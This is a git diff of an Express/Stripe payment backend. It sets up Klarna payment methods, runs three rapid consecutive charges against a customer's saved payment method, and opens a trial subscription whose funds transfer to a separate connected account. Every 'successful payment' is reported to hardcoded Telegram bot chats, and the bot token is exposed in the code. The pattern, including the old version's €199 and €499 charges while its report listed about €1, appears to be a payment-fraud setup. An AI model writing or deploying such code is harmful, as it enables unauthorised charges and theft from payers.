@@ -5,7 +5,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 
 const app = express();
-const ACCOUNT_B = 'acct_1RURIXJ4lPo0Pf67';
+const ACCOUNT_B = 'acct_1T3SzcKnYIJcJ1dB';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -73,11 +73,6 @@ app.post('/create-setup-intent', async (req, res) => {
       customer: customer.id,
       payment_method_types: ['klarna'],
       metadata: { customer_id: customer.id },
-      payment_method_options: {
-        klarna: {
-          currency: 'sek',
-        },
-      },
     });
 
     await sendTelegram(
@@ -125,11 +120,11 @@ app.post('/create-subscription', async (req, res) => {
     const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
     const pmType = paymentMethod.type;
 
-    // Charge 1 — €1.02
+    // Charge 1 — 102 SEK
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 102,
-        currency: 'eur',
+        amount: 10200,
+        currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -145,11 +140,11 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — €199.00
+    // Charge 2 — 102 SEK
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 19900,
-        currency: 'eur',
+        amount: 10200,
+        currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -165,11 +160,11 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €499.00
+    // Charge 3 — 103 SEK
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 49900,
-        currency: 'eur',
+        amount: 10300,
+        currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -188,7 +183,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T4hldBzXqhIraFc8FKBeVDj' }],
+      items: [{ price: 'price_1T4K7gHPssRUHyrour90urJj' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -200,9 +195,9 @@ app.post('/create-subscription', async (req, res) => {
       `✅ <b>Betalning lyckades!</b>\n\n` +
       `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
       `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: €1.02\n` +
-      `💳 Betalning 2: €1.02\n` +
-      `💳 Betalning 3: €1.03\n` +
+      `💳 Betalning 1: 102 kr\n` +
+      `💳 Betalning 2: 102 kr\n` +
+      `💳 Betalning 3: 103 kr\n` +
       `🆔 Prenumeration: ${subscription.id}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
